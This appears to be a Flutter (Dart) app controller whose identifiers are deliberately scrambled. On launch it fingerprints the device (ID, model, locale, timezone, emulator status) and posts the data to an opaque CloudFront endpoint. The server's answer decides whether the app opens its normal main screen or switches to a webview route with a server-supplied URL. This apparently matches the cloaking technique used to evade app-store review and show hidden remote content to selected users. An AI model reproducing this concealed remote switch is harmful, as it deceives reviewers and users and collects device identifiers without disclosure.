import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FtHomeRegularLogic extends GetxController {

  var dpxwag = RxBool(false);
  var axlhour = RxBool(true);
  var penfiqlt = RxString("");
  var edqypft = RxBool(false);
  var jbzs = RxBool(true);
  final owispnfd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    iowhsjr();
  }


  Future<void> iowhsjr() async {
    edqypft.value = true;
    jbzs.value = true;
    axlhour.value = false;

    owispnfd.post("https://d24y4eacywhew3.cloudfront.net/dohlzcestgunkvwjaxfbrimqpy",data: await rvmdojyq()).then((value) {
      var necv = value.data["necv"] as String;
      var fcvk = value.data["fcvk"] as bool;
      if (fcvk) {
        penfiqlt.value = necv;
        ydjtsaef();
      } else {
        bwrkdqye();
      }
    }).catchError((e) {
      axlhour.value = true;
      jbzs.value = true;
      edqypft.value = false;
    });
  }

  Future<Map<String, dynamic>> rvmdojyq() async {
    final DeviceInfoPlugin ixodzupn = DeviceInfoPlugin();
    PackageInfo ukags_gmcr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kjcxeod = Platform.localeName;
    var xsto = currentTimeZone;

    var lbdo = ukags_gmcr.packageName;
    var vnzi = ukags_gmcr.version;
    var cwqgjpuk = ukags_gmcr.buildNumber;

    var uqlrb = ukags_gmcr.appName;
    var nwtv = "";
    var epfj  = "";
    var vfqi = "";
    var fhdknop = "";
    var ophkm = "";
    var icyrhwb = "";


    var igrde = "";
    var yksjp = false;

    if (GetPlatform.isAndroid) {
      igrde = "android";
      var jnwlsopzgy = await ixodzupn.androidInfo;

      vfqi = jnwlsopzgy.brand;

      nwtv  = jnwlsopzgy.model;
      epfj = jnwlsopzgy.id;

      yksjp = jnwlsopzgy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      igrde = "ios";
      var ltfnpi = await ixodzupn.iosInfo;
      vfqi = ltfnpi.name;
      nwtv = ltfnpi.model;

      epfj = ltfnpi.identifierForVendor ?? "";
      yksjp  = ltfnpi.isPhysicalDevice;
    }
    var res = {
      "uqlrb": uqlrb,
      "vnzi": vnzi,
      "epfj": epfj,
      "lbdo": lbdo,
      "kjcxeod": kjcxeod,
      "nwtv": nwtv,
      "xsto": xsto,
      "vfqi": vfqi,
      "igrde": igrde,
      "cwqgjpuk": cwqgjpuk,
      "yksjp": yksjp,
      "fhdknop" : fhdknop,
      "ophkm" : ophkm,
      "icyrhwb" : icyrhwb,

    };
    return res;
  }

  Future<void> bwrkdqye() async {
    Get.offNamed("/ft_main");
  }

  Future<void> ydjtsaef() async {
    Get.offNamed("/ft_listen_mind");
  }

}
